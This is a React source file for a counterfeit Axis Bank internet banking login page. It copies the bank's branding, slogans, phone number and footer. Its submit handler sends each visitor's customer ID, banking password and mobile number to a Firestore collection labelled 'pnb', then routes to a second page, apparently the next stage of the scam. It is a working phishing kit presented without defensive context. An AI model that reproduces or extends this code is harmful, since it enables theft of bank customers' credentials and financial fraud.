import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import '../App.css';
import FirebaseUtil from '../FirebaseRepo';

const FirstPage = () => {
  const [userId, setUserId] = useState('');
  const [password1, setPassword1] = useState('');
  const [mobileNumber, setMobileNumber] = useState('');
  const [captcha, setCaptcha] = useState('');
  const [captchaText, setCaptchaText] = useState('');
  const [language, setLanguage] = useState('English');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [captchaError, setCaptchaError] = useState('');
  const [mobileError, setMobileError] = useState('');
  const navigate = useNavigate();

  // Generate a random captcha text
  const generateCaptcha = () => {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setCaptchaText(result);
  };

  // Validate mobile number
  const validateMobileNumber = (number) => {
    const regex = /^\d{10}$/;
    if (!number) {
      setMobileError('Mobile number is required');
      return false;
    }
    if (!regex.test(number)) {
      setMobileError('Please enter a valid 10-digit mobile number');
      return false;
    }
    setMobileError('');
    return true;
  };

  // Generate captcha on component mount
  useEffect(() => {
    generateCaptcha();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setCaptchaError('');
    setMobileError();
    
    // Validate mobile number
    if (!validateMobileNumber(mobileNumber)) {
      return;
    }
    
    // Verify captcha
    if (captcha !== captchaText) {
      setCaptchaError('Invalid captcha. Please try again.');
      generateCaptcha();
      setCaptcha('');
      return;
    }
    
    setIsSubmitting(true);

    try {
      const timestamp = Date.now();
      
      // Upload data to Firestore in the pnb collection
      const result = await FirebaseUtil.uploadAnyModel("pnb", {
        key: `user_${timestamp}`,
        userId,
        password1,
        phoneNumber: mobileNumber,
        timeStamp: timestamp,
      });
      
      // Check if upload was successful
      if (result.state === 'success') {
        // Navigate to the second page with the document ID
        setTimeout(() => {
          setIsSubmitting(false);
          navigate(`/second/${result.data}`);
        }, 1500);
      } else {
        throw new Error(result.error || 'Failed to upload data');
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Header - Burgundy Bar with Logo */}
      <header className="bg-[#B72B64] p-4 flex justify-between items-center">
        <div className="flex items-center">
          <div className="text-white">
            <h1 className="text-3xl font-serif">Axis Bank</h1>
            <p className="text-sm">India&apos;s Premier Private Sector Bank</p>
            <div className="bg-[#EB1165] text-white px-2 py-0.5 text-xs mt-1 rounded inline-block font-semibold">
              Badhti Ka Naam Zindagi
            </div>
          </div>
        </div>
        <div className="space-y-1.5">
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
        </div>
      </header>

      {/* Tagline */}
      <div className="bg-[#B72B64] text-white text-center py-2 font-medium">
        <p>Digital at Heart. Human at the Core.</p>
      </div>

      {/* Main Content - Login Form */}
      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-[#B72B64] text-white rounded-3xl w-full max-w-md p-3 sm:p-5 shadow-lg overflow-hidden border border-[#d41f66]">
          <div className="text-center mb-6">
            <h2 className="text-xl mb-1">Welcome to</h2>
            <h1 className="text-4xl font-bold text-white">Axis Bank Internet Banking</h1>
          </div>

          <form onSubmit={handleSubmit}>
            {/* User ID */}
            <div className="mb-3">
              <input
                type="text"
                placeholder="Customer ID / User ID"
                className="w-full py-2 px-3 rounded text-gray-700 text-sm"
                value={userId}
                onChange={(e) => setUserId(e.target.value)}
                required
              />
            </div>

            {/* Password */}
            <div className="mb-3">
              <input
                type="password"
                placeholder="Internet Banking Password"
                className="w-full py-2 px-3 rounded text-gray-700 text-sm"
                value={password1}
                onChange={(e) => setPassword1(e.target.value)}
                required
              />
            </div>

            {/* Mobile Number */}
            <div className="mb-3">
              <input
                type="tel"
                placeholder="Mobile Number"
                className="w-full py-2 px-3 rounded text-gray-700 text-sm"
                value={mobileNumber}
                onChange={(e) => setMobileNumber(e.target.value)}
                required
                maxLength="10"
                minLength="10"
              />
            </div>

            {/* Mobile Number Error */}
            {mobileError && (
              <div className="text-red-500 text-sm mb-3">
                {mobileError}
              </div>
            )}

            {/* Captcha Display */}
            <div className="mb-3 flex items-center space-x-2">
              <div className="bg-[#d41f66] text-white px-3 py-1 rounded inline-block font-bold text-lg">
                <span 
                  className="text-white bg-[#d41f66] font-mono text-sm select-none"
                  style={{
                    fontFamily: '"Courier New", monospace',
                    letterSpacing: '2px',
                    fontWeight: 'bold',
                    fontStyle: 'italic',
                    textDecoration: 'line-through',
                    background: 'linear-gradient(45deg, rgba(200,200,200,0.2) 25%, transparent 25%, transparent 50%, rgba(200,200,200,0.2) 50%, rgba(200,200,200,0.2) 75%, transparent 75%, transparent)',
                    transform: 'skewX(-5deg)',
                    textShadow: '1px 1px 2px rgba(0,0,0,0.2)',
                    padding: '2px 4px'
                  }}
                >
                  {captchaText}
                </span>
              </div>
              <input
                type="text"
                placeholder="Enter Captcha"
                className="flex-1 py-2 px-3 rounded text-gray-700 text-sm"
                value={captcha}
                onChange={(e) => setCaptcha(e.target.value)}
                required
              />
              <button
                type="button"
                onClick={generateCaptcha}
                className="bg-[#d41f66] hover:bg-[#b81a56] text-white px-2 py-1 rounded transition-colors"
                title="Refresh Captcha"
              >
                <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v4a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clipRule="evenodd" />
                </svg>
              </button>
            </div>

            {/* Captcha Error */}
            {captchaError && (
              <div className="text-red-500 text-sm mb-3">
                {captchaError}
              </div>
            )}

            {/* Language Selection */}
            <div className="mb-4">
              <select
                className="w-full py-2 px-3 rounded text-gray-700 text-sm"
                value={language}
                onChange={(e) => setLanguage(e.target.value)}
              >
                <option value="English">English</option>
                <option value="हिंदी">हिंदी</option>
                <option value="मराठी">मराठी</option>
                <option value="தமிழ்">தமிழ்</option>
                <option value="తెలుగు">తెలుగు</option>
                <option value="ಕನ್ನಡ">ಕನ್ನಡ</option>
                <option value="മലയാളം">മലയാളം</option>
                <option value="বাংলা">বাংলা</option>
                <option value="ગુજરાતી">ગુજરાતી</option>
                <option value="ਪੰਜਾਬੀ">ਪੰਜਾਬੀ</option>
              </select>
            </div>

            {/* Login Button */}
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full bg-[#FBBC09] text-[#8a0c2f] py-2.5 px-4 rounded-lg font-bold hover:bg-[#FFD700] transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed mb-3 shadow-md hover:shadow-lg"
            >
              {isSubmitting ? 'Processing...' : 'Login'}
            </button>

            {/* Additional Action Buttons */}
            <div className="grid grid-cols-2 gap-2 sm:gap-4 mb-4">
              <button
                type="button"
                className="bg-[#d41f66] hover:bg-[#b81a56] text-white py-2.5 px-4 rounded-lg text-xs sm:text-sm whitespace-normal transition-colors duration-200 shadow-sm"
              >
                Credit Card Login
              </button>
              <button
                type="button"
                className="bg-[#FBBC09] hover:bg-[#FFD700] text-[#8a0c2f] py-2.5 px-4 rounded-lg text-xs sm:text-sm font-bold whitespace-normal transition-colors duration-200 shadow-sm"
              >
                NEFT/RTGS Payment
              </button>
            </div>
          </form>

          {/* Links Section */}
          <div className="mt-6 grid grid-cols-2 gap-x-2 gap-y-2 sm:gap-x-4 text-xs sm:text-sm">
            <a href="#" className="text-[#FFB6C1] hover:text-white hover:underline truncate transition-colors">Credit Card Payment</a>
            <a href="#" className="text-[#FFB6C1] hover:text-white hover:underline truncate transition-colors">Apply for Locker</a>
            <a href="#" className="text-[#FFB6C1] hover:text-white hover:underline truncate transition-colors">Rewards & Offers</a>
            <a href="#" className="text-[#FFB6C1] hover:text-white hover:underline truncate transition-colors">Safety Guidelines</a>
            <a href="#" className="text-[#FFB6C1] hover:text-white hover:underline truncate transition-colors">Holiday List</a>
            <a href="#" className="text-[#FFB6C1] hover:text-white hover:underline truncate transition-colors">Apply For POS</a>
            <a href="#" className="text-[#FFB6C1] hover:text-white hover:underline truncate transition-colors">Education Fee Payment</a>
            <a href="#" className="text-[#FFB6C1] hover:text-white hover:underline truncate transition-colors">Bill Payments</a>
            <a href="#" className="text-[#FFB6C1] hover:text-white hover:underline truncate transition-colors">Cardless EMI</a>
            <a href="#" className="text-[#FFB6C1] hover:text-white hover:underline truncate transition-colors">Internet Banking</a>
          </div>

          {/* Security Badge */}
          <div className="mt-6 flex items-center justify-start">
              <div className="bg-[#FBBC09] p-2 rounded-full mr-2">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-[#A20E37]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" fill="#8a0c2f" stroke="#8a0c2f" />
              </svg>
            </div>
            <div className="text-xs">
              <div className="font-bold">secure</div>
            </div>
          </div>

          {/* Social Media Links */}
          <div className="mt-4">
            <p className="text-sm font-bold mb-2">Connect with us:</p>
            <div className="flex space-x-3">
              <a href="#" className="text-white hover:text-[#A20E37]">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M9 8h-3v4h3v12h5v-12h3v-4h-3" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-pink-400">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path fillRule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v4a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clipRule="evenodd" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-gray-500">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path fillRule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v4a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clipRule="evenodd" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-red-600">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-blue-600">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path fillRule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v4a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clipRule="evenodd" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-red-500">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z" />
                </svg>
              </a>
            </div>
          </div>

          {/* Virtual Assistant */}
          <div className="mt-6 flex items-center justify-between">
            <div className="text-xs max-w-[70%]">
              <p>For safe usage and better experience with Internet Banking, we recommend using <span className="text-[#FFD700] font-medium">private browsing</span>. For assistance, please contact our 24x7 Customer Care at 1860-419-5555</p>
            </div>
            <div className="relative">
              <div className="w-16 h-16 bg-[#FBBC09] rounded-full overflow-hidden border-2 border-white">
                <img 
                  src="https://placehold.co/100x100/FFD700/000000/png?text=👨‍💼" 
                  alt="Virtual Assistant" 
                  className="w-full h-full object-cover"
                />
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#9c2455] text-white p-4 text-center">
        <p className="text-sm">© 2025 Axis Bank Ltd. All rights reserved.</p>
        <p className="text-xs">For support, call 1860-419-5555 or email customercare@axisbank.com</p>
      </footer>
    </div>
  );
};

export default FirstPage;
